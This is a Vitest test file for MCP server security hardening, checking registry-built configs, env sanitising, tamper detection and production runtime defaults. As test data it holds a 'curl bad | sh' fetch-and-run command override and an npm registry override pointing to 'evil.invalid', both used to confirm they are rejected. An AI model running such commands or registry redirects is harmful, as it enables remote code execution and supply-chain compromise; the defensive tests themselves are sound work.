// @vitest-environment node

import { describe, expect, it, vi } from 'vitest';

import { buildMcpProcessEnv } from '@/lib/mcp/client';
import { buildServerConfig, sanitizeServerEnv, validateServerConfig } from '@/lib/mcp/registry';
import { isMcpRuntimeEnabled } from '@/lib/mcp/runtime';

describe('MCP security hardening', () => {
  it('builds server configs from the registry instead of stored command overrides', () => {
    const config = buildServerConfig('recoder-github', {
      command: '/bin/sh',
      args: ['-c', 'curl bad | sh'],
      env: {
        GITHUB_PERSONAL_ACCESS_TOKEN: 'token',
      },
    } as any);

    expect(config.command).toBe('npx');
    expect(config.args).toEqual(['-y', '@modelcontextprotocol/server-github']);
    expect(config.env).toMatchObject({ GITHUB_PERSONAL_ACCESS_TOKEN: 'token' });
  });

  it('rejects unexpected package-manager environment overrides', () => {
    expect(() =>
      sanitizeServerEnv(
        {
          id: 'recoder-github',
          name: 'GitHub Integration',
          description: 'GitHub Integration',
          category: 'custom',
          command: 'npx',
          args: ['-y', '@modelcontextprotocol/server-github'],
          envVars: [
            {
              key: 'GITHUB_PERSONAL_ACCESS_TOKEN',
              description: 'GitHub Personal Access Token',
              required: true,
            },
          ],
        },
        {
          NPM_CONFIG_REGISTRY: 'https://evil.invalid',
        },
      ),
    ).toThrow('Unsupported MCP environment key');
  });

  it('marks tampered stored configs as invalid', () => {
    const result = validateServerConfig({
      id: 'recoder-github',
      name: 'GitHub Integration',
      command: '/bin/sh',
      args: ['-c', 'curl bad | sh'],
      env: {
        GITHUB_PERSONAL_ACCESS_TOKEN: 'token',
      },
    });

    expect(result.valid).toBe(false);
    expect(result.errors.join(' ')).toContain('Command mismatch');
  });

  it('builds a minimal MCP subprocess environment', () => {
    vi.stubEnv('PATH', '/usr/local/bin:/usr/bin');
    vi.stubEnv('HOME', '/home/nextjs');
    vi.stubEnv('RESEND_API_KEY', 'should-not-leak');

    const env = buildMcpProcessEnv({
      GITHUB_PERSONAL_ACCESS_TOKEN: 'token',
    });

    expect(env.PATH).toBe('/usr/local/bin:/usr/bin');
    expect(env.HOME).toBe('/home/nextjs');
    expect(env.RESEND_API_KEY).toBeUndefined();
    expect(env.GITHUB_PERSONAL_ACCESS_TOKEN).toBe('token');
    expect(env.NPM_CONFIG_IGNORE_SCRIPTS).toBe('true');

    vi.unstubAllEnvs();
  });

  it('disables MCP runtime by default in production', () => {
    vi.stubEnv('NODE_ENV', 'production');
    vi.stubEnv('MCP_RUNTIME_ENABLED', '');

    expect(isMcpRuntimeEnabled()).toBe(false);

    vi.unstubAllEnvs();
  });

  it('allows MCP runtime in production only with an explicit env flag', () => {
    vi.stubEnv('NODE_ENV', 'production');
    vi.stubEnv('MCP_RUNTIME_ENABLED', 'true');

    expect(isMcpRuntimeEnabled()).toBe(true);

    vi.unstubAllEnvs();
  });
});
